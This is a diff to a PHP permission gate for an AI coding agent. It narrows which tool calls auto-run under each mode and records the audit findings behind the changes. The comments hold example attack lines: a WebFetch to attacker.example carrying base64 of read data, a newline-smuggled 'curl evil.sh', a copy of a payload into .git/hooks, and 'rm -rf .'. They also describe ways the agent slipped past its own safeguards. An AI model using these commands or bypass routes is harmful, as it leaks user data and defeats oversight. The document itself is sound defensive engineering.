@@ -20,11 +20,16 @@ use SugarCraft\Crush\ToolCall;
  * matcher and {@see PermissionRule::matches()} is it.
  *
  * Four modes are implemented here (P2B.S2 + P2B.S3):
- * - Default:     reads silently; writes/networking always Ask
- * - AcceptEdits: scoped filesystem writes auto-Allow; everything else Ask
+ * - Default:     reads silently; writes/networking (WebFetch included) Ask
+ * - AcceptEdits: `Edit`/`Write` inside the project root and the create-only
+ *                shell primitives (`mkdir`/`touch`/`rmdir`) on contained
+ *                paths auto-Allow; everything else — `rm`/`mv`/`cp`, WebFetch,
+ *                protected and out-of-root paths — Ask (audit F-P4)
  * - Plan:        reads and provably read-only `Bash` Allow; every other `Bash`
  *                and every other write Deny
- * - Auto:        everything runs gated by SafetyClassifier; 3-strike / 20-total circuit breaker
+ * - Auto:        everything runs gated by SafetyClassifier (Bash by command,
+ *                Edit/Write by path, WebFetch by what its URL carries), and
+ *                `mcp__*` Asks; 3-strike / 20-total circuit breaker
  *
  * The Plan line has been wrong twice, and both are worth knowing. It first
  * read "all writes Deny" while {@see evaluatePlan()} allowed every `Bash` call
@@ -65,8 +70,21 @@ final class PermissionGate
      * Filesystem primitive commands that AcceptEdits may auto-approve, via Bash,
      * when scoped to the working directory. Real tool calls route these through
      * Bash(command: "mkdir ..."); there is no dedicated "mkdir" tool at runtime.
+     *
+     * CREATE-ONLY, and `rm`, `mv` and `cp` used to be here (audit F-P4). The
+     * mode named for accepting EDITS asked before every `Edit`/`Write` — the
+     * reviewable, diff-previewed tools — while running `rm ./src/Main.php`
+     * unprompted: the one destructive verb set was granted and the safe one
+     * refused, which steered the model toward the opaque shell route
+     * `Write.php`'s own doc-comment says that tool exists to avoid. Now the
+     * tools carry the grant ({@see evaluateAcceptEdits()}) and the shell keeps
+     * only the verbs that cannot destroy content: `mkdir`/`touch` create (a
+     * `touch` of an existing file changes its times, not its bytes) and `rmdir`
+     * removes only an EMPTY directory. `cp` and `mv` are not on the list
+     * because both overwrite their destination; Claude Code's `acceptEdits`
+     * makes the same cut.
      */
-    private const SCOPED_WRITE_COMMANDS = ['mkdir', 'touch', 'mv', 'cp', 'rm', 'rmdir'];
+    private const SCOPED_WRITE_COMMANDS = ['mkdir', 'touch', 'rmdir'];
 
     /**
      * Circuit-breaker thresholds for Auto mode.
@@ -233,14 +251,18 @@ final class PermissionGate
      *   and denies every other one, so the verdict lives in the command — which
      *   a declaration does not have. Refusing the name would refuse the
      *   read-only uses too; each real call is judged when it arrives.
-     * - `DontAsk` refuses every declaration that is not a read-only tool.
+     * - `DontAsk` refuses every declaration that is not a read-only tool —
+     *   `WebFetch` included since audit F-P6, even when a
+     *   `WebFetch(domain:…)` allow rule would grant some real calls: that
+     *   rule is argument-scoped, so it cannot match a declaration (the same
+     *   cost `Allow Bash(git *)` has always had for a `Bash` declaration).
      * - `Auto` refuses NOTHING through its mode evaluator, and this is
      *   structural rather than an oversight: Auto's judgement is
-     *   {@see SafetyClassifier}'s, and the classifier reads
-     *   `arguments['command']` — a name alone is never dangerous to it. A
-     *   declaration under Auto is therefore only refusable by a Deny rule
-     *   (above). Auto's real enforcement is per-call, at whichever layer runs
-     *   the call, through {@see evaluate()}.
+     *   {@see SafetyClassifier}'s, and the classifier reads the call's
+     *   ARGUMENTS — the command, the write target, the URL — which a
+     *   declaration does not have. A declaration under Auto is therefore only
+     *   refusable by a Deny rule (above). Auto's real enforcement is per-call,
+     *   at whichever layer runs the call, through {@see evaluate()}.
      * - `Default` / `AcceptEdits` refuse nothing (they `Ask`), and
      *   `BypassPermissions` refuses nothing by definition.
      */
@@ -274,9 +296,11 @@ final class PermissionGate
      *        the same distinction (real call vs. hypothetical) into different
      *        subsystems, which is why they are separate parameters rather than
      *        one: an Auto strike is about STATE, this is about EVIDENCE.
-     * @param string|null $projectRoot see {@see evaluate()}; only the rules
-     *        read it — the mode evaluators judge a tool KIND or a command, not
-     *        a resolved path.
+     * @param string|null $projectRoot see {@see evaluate()}. The rules read
+     *        it, and so do the two evaluators that judge a WRITE TARGET —
+     *        `accept-edits` granting an in-root `Edit`/`Write` and `auto`
+     *        classifying one ({@see WritePathScope}). Every other evaluator
+     *        judges a tool KIND or a command, not a resolved path.
      */
     private function decide(
         ToolCall $call,
@@ -300,10 +324,10 @@ final class PermissionGate
         // 2. Mode-specific logic
         return match ($this->mode) {
             PermissionMode::Default => $this->evaluateDefault($call),
-            PermissionMode::AcceptEdits => $this->evaluateAcceptEdits($call),
+            PermissionMode::AcceptEdits => $this->evaluateAcceptEdits($call, $projectRoot),
             PermissionMode::Plan => $this->evaluatePlan($call, $argumentsKnown),
             PermissionMode::Auto => $commitAutoStrikes
-                ? $this->evaluateAuto($call)
+                ? $this->evaluateAuto($call, $projectRoot)
                 : $this->autoDeclarationDecision(),
             // P2B.S4: DontAsk and BypassPermissions have dedicated evaluators
             PermissionMode::DontAsk => $this->evaluateDontAsk($call),
@@ -355,23 +379,53 @@ final class PermissionGate
     }
 
     /**
-     * AcceptEdits: scoped filesystem writes auto-approve; protected paths still prompt.
+     * AcceptEdits: edits inside the project auto-approve; everything else asks.
+     *
+     * Two grants, both on contained, unprotected targets (audit F-P4):
+     *
+     * - the `Edit` and `Write` TOOLS, when {@see WritePathScope::of()} places
+     *   their `file_path` strictly inside the project root and off the
+     *   protected segments (`.git`, `.sugar-crush`, `.mcp.json`). With the
+     *   root in hand (the live hook chain supplies it) the path is resolved
+     *   the way the tool resolves it, symlinks included; without one only a
+     *   relative, lexically contained spelling qualifies;
+     * - the create-only shell primitives in {@see SCOPED_WRITE_COMMANDS} via
+     *   {@see isScopedWriteTool()}.
+     *
+     * Before F-P4 it was the other way round: `Edit`/`Write` asked — a hard
+     * refusal wherever no prompt is attached — while `rm`, `mv` and `cp` on
+     * any contained path ran unprompted. `rm`/`mv`/`cp` now ask like every
+     * other shell command, and so does `WebFetch`, which left the read-only
+     * class in audit F-P6.
      */
-    private function evaluateAcceptEdits(ToolCall $call): PermissionDecision
+    private function evaluateAcceptEdits(ToolCall $call, ?string $projectRoot): PermissionDecision
     {
         // Reads always allow in AcceptEdits
         if ($this->isReadOnlyTool($call)) {
             return PermissionDecision::Allow;
         }
 
-        // Scoped filesystem writes (mkdir, touch, mv, cp, rm, rmdir) auto-allow
+        if (in_array($call->name, self::EDIT_TOOLS, true)) {
+            return WritePathScope::of($call->arguments['file_path'] ?? null, $projectRoot) === WritePathScope::INSIDE
+                ? PermissionDecision::Allow
+                : PermissionDecision::Ask;
+        }
+
+        // Create-only shell primitives (mkdir, touch, rmdir) on contained paths
         if ($this->isScopedWriteTool($call)) {
             return PermissionDecision::Allow;
         }
 
-        // Everything else (network, shell commands, non-scoped writes) asks
+        // Everything else (network, shell commands, destructive verbs) asks
         return PermissionDecision::Ask;
     }
+
+    /**
+     * The file-editing tools `accept-edits` grants inside the root. Both take
+     * the target as `file_path` ({@see PermissionRule::SUBJECT_ARGUMENTS}
+     * pins that against the schemas).
+     */
+    private const EDIT_TOOLS = ['Edit', 'Write'];
 
     /**
      * Auto: everything runs gated by SafetyClassifier; circuit breaker triggers Ask after
@@ -383,9 +437,16 @@ final class PermissionGate
      * real call (a safe command genuinely breaks a run of blocked ones) and
      * corrupting for a hypothetical one — hence {@see autoDeclarationDecision()}.
      *
-     * @see SafetyClassifier for the 13 dangerous-action categories.
+     * An `mcp__*` call ASKS rather than being classified (audit F-P3(b)): its
+     * capability is server-defined and invisible from here — `mcp__db__drop_table`
+     * ran unprompted under auto — so there is nothing a classifier could read.
+     * It is neither a block nor a safe call, so it leaves the breaker's
+     * counters exactly as they were: a prompt is not a strike, and an
+     * unjudged call must not reset a run of real ones.
+     *
+     * @see SafetyClassifier for the dangerous-action categories.
      */
-    private function evaluateAuto(ToolCall $call): PermissionDecision
+    private function evaluateAuto(ToolCall $call, ?string $projectRoot): PermissionDecision
     {
         // SafetyClassifier is the gatekeeper for Auto mode. Fail CLOSED when it's
         // missing — a misconfigured gate must never silently become "allow everything";
@@ -394,7 +455,11 @@ final class PermissionGate
             return PermissionDecision::Ask;
         }
 
-        $category = $this->classifier->classify($call);
+        if (str_starts_with($call->name, 'mcp__')) {
+            return PermissionDecision::Ask;
+        }
+
+        $category = $this->classifier->classify($call, $projectRoot);
 
         // Action is safe — reset counters and allow
         if ($category === null) {
@@ -428,14 +493,17 @@ final class PermissionGate
      * leave the circuit-breaker counters exactly as it found them.
      *
      * Takes no {@see ToolCall} on purpose. A declaration carries no arguments,
-     * and {@see SafetyClassifier::classify()} reads `arguments['command']`, so
-     * the classifier returns null for every possible declaration — running it
-     * would be theatre, and reproducing {@see evaluateAuto()}'s counter
-     * arithmetic below a category that cannot occur would be unreachable code
-     * dressed as rigour. Auto's declaration policy is the single statement
-     * below, and {@see refuses()} says so where a caller will read it: under
-     * Auto only an explicit Deny RULE (matched before this method, in
-     * {@see decide()}) refuses a declaration.
+     * and {@see SafetyClassifier::classify()} judges nothing BUT arguments —
+     * a `Bash` command, an `Edit`/`Write` target, a `WebFetch` URL. Running it
+     * on a bare name would not be a weaker verdict but a wrong one: since
+     * audit F-P3(b) an absent write target reads as "not provably inside the
+     * root" and an absent URL as "unparseable", both fail-closed BLOCKS that
+     * describe the missing argument rather than anything the declared tool
+     * would do. Auto's declaration policy is the single statement below, and
+     * {@see refuses()} says so where a caller will read it: under Auto only an
+     * explicit Deny RULE (matched before this method, in {@see decide()})
+     * refuses a declaration. (An `mcp__*` call ASKS under Auto; a declaration
+     * of one is not refused either, since an Ask never is.)
      *
      * Fail-closed parity with {@see evaluateAuto()} is kept for the
      * missing-classifier case even though `refuses()` treats Ask and Allow
@@ -493,8 +561,10 @@ final class PermissionGate
     }
 
     /**
-     * DontAsk: auto-denies anything not pre-approved. Read-only tools (Read/Grep/Glob/WebFetch)
-     * are implicitly allowed without an explicit rule. Hook-approved calls would also be allowed
+     * DontAsk: auto-denies anything not pre-approved. Read-only tools (Read/Grep/Glob/Lsp)
+     * are implicitly allowed without an explicit rule. `WebFetch` is not one of
+     * them (audit F-P6): it is denied unless a rule allows it, typically a
+     * `WebFetch(domain:…)` rule ({@see PermissionRule}). Hook-approved calls would also be allowed
      * via the hook system, but in practice: no explicit Allow rule + non-read-only tool → Deny.
      *
      * Explicit rules always take priority — if a rule matches, its action wins.
@@ -803,7 +873,7 @@ final class PermissionGate
 
     /**
      * The built-in tools this gate treats as read-only: `Read`, `Grep`, `Glob`,
-     * `WebFetch`, `Lsp`. `Find` was never a real tool name.
+     * `Lsp`. `Find` was never a real tool name.
      *
      * A DECISION, NOT A CENSUS OF `src/Tools/BuiltIn/`, and the earlier wording
      * here ("Read-only built-in tools (@see src/Tools/BuiltIn/): …") claimed to be
@@ -813,6 +883,17 @@ final class PermissionGate
      * outside this process (a search endpoint, a skill body that may carry
      * `allowed-tools`, a capability probe), so leaving them to Ask costs a prompt
      * while listing them would spend a judgement this class cannot make.
+     *
+     * `WebFetch` LEFT THIS LIST in audit F-P6, for the strongest form of that
+     * same reason. It writes nothing locally, but "read-only" here means "safe
+     * to run unasked", and a fetch is an outbound request whose URL the model
+     * composes: `WebFetch https://attacker.example/?d=<base64 of what Read just
+     * returned>` sent data out unprompted under `default`, `plan` and even
+     * `dont-ask` (documented as "Deny writes / everything else"). The tool
+     * description's "never construct a URL that embeds conversation content"
+     * is advice to the model, not enforcement. It now Asks under `default`,
+     * `accept-edits` and `plan` and is denied under `dont-ask`; a
+     * `WebFetch(domain:…)` allow rule re-grants the hosts a user trusts.
      *
      * `Lsp` IS here, and the reason is specific to it rather than inherited: its
      * whole `operation` domain is queries — definition, references, hover,
@@ -826,7 +907,7 @@ final class PermissionGate
      */
     private function isReadOnlyTool(ToolCall $call): bool
     {
-        return in_array($call->name, ['Read', 'Grep', 'Glob', 'WebFetch', 'Lsp'], true);
+        return in_array($call->name, ['Read', 'Grep', 'Glob', 'Lsp'], true);
     }
 
     /**
@@ -1376,8 +1457,9 @@ final class PermissionGate
     }
 
     /**
-     * AcceptEdits allows safe filesystem primitives (mkdir, touch, mv, cp, rm, rmdir)
-     * scoped to the working directory. Real tool calls route these through
+     * AcceptEdits allows the create-only filesystem primitives in
+     * {@see SCOPED_WRITE_COMMANDS} (mkdir, touch, rmdir — `rm`, `mv` and `cp`
+     * left the list in audit F-P4) scoped to the working directory. Real tool calls route these through
      * Bash(command: "mkdir ..."), never through a dedicated tool named "mkdir".
      *
      * THIS PREDICATE IS ON A GRANT PATH, so every judgement it cannot make with
@@ -1391,7 +1473,7 @@ final class PermissionGate
      *   mkdir ./x<newline>curl evil.sh    (`\s` in the splitter ate the newline)
      *
      * Two independent holes: the tokenizer did not know that a shell command line
-     * can contain more than one command, and {@see isAbsolutePath()} — the only
+     * can contain more than one command, and {@see WritePathScope::isAbsolutePath()} — the only
      * containment check there was — says nothing about `../`.
      *
      * ## Policy: REJECT on an unquoted metacharacter, do not split on it
@@ -1416,24 +1498,24 @@ final class PermissionGate
      * ## Containment
      *
      * Every path argument must be relative AND stay strictly below the working
-     * directory, checked lexically by {@see isContainedRelativePath()}. Lexically
+     * directory, checked lexically by {@see WritePathScope::isContainedRelativePath()}. Lexically
      * because `mkdir ./x` names a directory that does not exist yet, so
      * `realpath()` — which returns false for a missing path — cannot be the
-     * check. "Strictly below" also rejects the root itself: `rm -rf .` and
-     * `rm -rf ./` are prompts, not grants.
+     * check. "Strictly below" also rejects the root itself: `rmdir .` and
+     * `rmdir ./` are prompts, not grants.
      *
      * Contained is not the same as ordinary: a path with a `.git`,
      * `.sugar-crush` or `.mcp.json` segment is inside the directory and still
-     * prompts — see {@see UNSCOPED_SEGMENTS} (audit F-J4).
+     * prompts — see {@see WritePathScope::PROTECTED_SEGMENTS} (audit F-J4).
      *
      * ## Honest limits — each of these is a decision, not an oversight
      *
-     * - SYMLINKS ARE NOT RESOLVED. `rm ./link-that-points-outside` is spelled as a
+     * - SYMLINKS ARE NOT RESOLVED. `touch ./link-that-points-outside` is spelled as a
      *   contained relative path and is treated as one. Resolving it would mean
      *   touching the filesystem, which this class does not do, and would still be
      *   a TOCTOU race against the command it is approving. Callers wanting real
      *   containment need it enforced where the command runs, not here.
-     * - GLOBS ARE NOT EXPANDED. `rm ./*` is judged as the literal token `./*`.
+     * - GLOBS ARE NOT EXPANDED. `touch ./*` is judged as the literal token `./*`.
      *   A glob cannot introduce a command and cannot escape the directory it is
      *   anchored in, but `{a,b}` brace expansion CAN (`{.,..}/x`), which is why
      *   `{`/`}` are in the rejected metacharacter set and `*`/`?`/`[` are not.
@@ -1447,7 +1529,7 @@ final class PermissionGate
      *   into a real write — and a real delete — one directory above the
      *   working directory. That particular spelling now prompts for an
      *   unrelated reason (`.<star>` can name `.git`, see
-     *   {@see UNSCOPED_SEGMENTS}), but `./.?/` is still granted here and,
+     *   {@see WritePathScope::PROTECTED_SEGMENTS}), but `./.?/` is still granted here and,
      *   MEASURED the same way, still expands to `./../` under dash.
      *
      *   What makes the omission safe is that
@@ -1518,70 +1600,12 @@ final class PermissionGate
         }
 
         foreach ($paths as $path) {
-            if (!$this->isContainedRelativePath($path) || $this->namesUnscopedSegment($path)) {
+            if (!WritePathScope::isContainedRelativePath($path) || WritePathScope::namesProtectedSegment($path)) {
                 return false;
             }
         }
 
         return true;
-    }
-
-    /**
-     * Path segments that are inside the working directory by spelling and
-     * still not "an ordinary scoped write" (audit F-J4) — matched against
-     * EVERY segment, so `.git`, `./.git/hooks/x`, `a/.git/b` and `./sub/.git`
-     * all count.
-     *
-     *  - `.git`: the repository's own machinery. `cp ./payload.sh
-     *    ./.git/hooks/pre-commit` auto-ran under `accept-edits` and planted
-     *    code that executes on the user's next `git commit`, outside any
-     *    sugar-crush session; `rm ./.git/index`, `mv ./x ./.git/HEAD` and a
-     *    nested `mkdir ./sub/.git` are no more "an edit" than that is.
-     *    {@see \SugarCraft\Crush\Hooks\BuiltIn\ProtectFilesHook} denies the
-     *    hooks/info half outright in every mode; this is the wider, cheaper
-     *    half — one prompt for anything that touches `.git` at all.
-     *  - `.sugar-crush`: hooks, agent presets, rules, skills and the
-     *    permission settings tiers all load from it. The hook's write-only
-     *    patterns name individual files, so `cp ./hooks.yaml ./.sugar-crush/`
-     *    (a DIRECTORY target) and `cp ./x ./.sugar-crush/settings.json` slipped
-     *    past both layers.
-     *  - `.mcp.json`: every entry is a command the next launch spawns as a
-     *    stdio MCP server.
-     *
-     * NOT LISTED, AND STILL GRANTED HERE: `.claude/` and `.opencode/` (foreign
-     * agent presets and skills are discovered from them) and anything else in
-     * the policy-file surface the audit tracks as known #9 — closing that
-     * surface is a policy-file inventory, not a line in this list.
-     *
-     * Matched with `fnmatch()` and FNM_PERIOD, the way bash matches a glob to a
-     * dotfile (writing STAR for the asterisk so this docblock does not close
-     * on itself): `./.gSTAR/hooks/x` and `./.gi?/x` name `.git` to the shell —
-     * globs are NOT expanded before this check, see {@see isScopedWriteTool()}
-     * — while `./STAR/x` and `./?git/x` do not, so `rm ./STAR` keeps its
-     * grant. Lowercased first because on a
-     * case-insensitive filesystem `.GIT` is the repository; on Linux that
-     * widening costs one prompt for a name nobody uses. A QUOTED glob is
-     * literal to bash but arrives here quote-stripped, so it is refused too —
-     * the fail-closed direction.
-     *
-     * @var list<string>
-     */
-    private const UNSCOPED_SEGMENTS = ['.git', '.sugar-crush', '.mcp.json'];
-
-    private function namesUnscopedSegment(string $path): bool
-    {
-        foreach (explode('/', strtolower($path)) as $segment) {
-            if ($segment === '' || $segment === '.' || $segment === '..') {
-                continue;
-            }
-            foreach (self::UNSCOPED_SEGMENTS as $name) {
-                if (fnmatch($segment, $name, FNM_PERIOD)) {
-                    return true;
-                }
-            }
-        }
-
-        return false;
     }
 
     /**
@@ -1733,47 +1757,5 @@ final class PermissionGate
         }
 
         return true;
-    }
-
-    /**
-     * Does `$path` name something strictly below the working directory?
-     *
-     * Resolved LEXICALLY — no filesystem access — because the paths this gate
-     * approves routinely do not exist yet (`mkdir ./x` is the whole point) and
-     * `realpath()` returns false for those. Each `..` pops one segment; a `..`
-     * with nothing to pop means the path escapes, and a path that resolves to
-     * depth 0 IS the working directory rather than something inside it, so
-     * `rm -rf .` prompts.
-     */
-    private function isContainedRelativePath(string $path): bool
-    {
-        if ($path === '' || $this->isAbsolutePath($path)) {
-            return false;
-        }
-
-        $depth = 0;
-
-        foreach (explode('/', $path) as $segment) {
-            if ($segment === '' || $segment === '.') {
-                continue;
-            }
-
-            if ($segment === '..') {
-                if ($depth === 0) {
-                    return false;
-                }
-                --$depth;
-                continue;
-            }
-
-            ++$depth;
-        }
-
-        return $depth > 0;
-    }
-
-    private function isAbsolutePath(string $path): bool
-    {
-        return str_starts_with($path, '/') || str_starts_with($path, '~');
     }
 }
